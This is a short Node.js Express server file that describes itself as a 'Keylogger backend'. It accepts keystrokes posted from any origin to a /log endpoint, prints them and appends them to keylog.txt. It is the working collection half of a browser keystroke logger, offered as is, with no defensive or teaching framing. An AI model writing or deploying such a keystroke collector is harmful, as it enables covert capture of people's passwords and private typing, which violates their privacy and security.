const express = require('express');
const fs = require('fs');
const cors = require('cors');
const app = express();
const port = 3000;

// Enable CORS for frontend requests
app.use(cors());

// Middleware to parse JSON bodies
app.use(express.json());

// Route to log keys
app.post('/log', (req, res) => {
  const { key } = req.body;
  if (key) {
    // Log the key to the console
    console.log('Key pressed:', key);

    // Optionally log the keys to a file
    fs.appendFile('keylog.txt', key, (err) => {
      if (err) {
        console.error('Error writing to file', err);
      }
    });

    res.json({ status: 'Key logged successfully', key });
  } else {
    res.status(400).json({ error: 'No key provided' });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Keylogger backend running at http://localhost:${port}`);
});
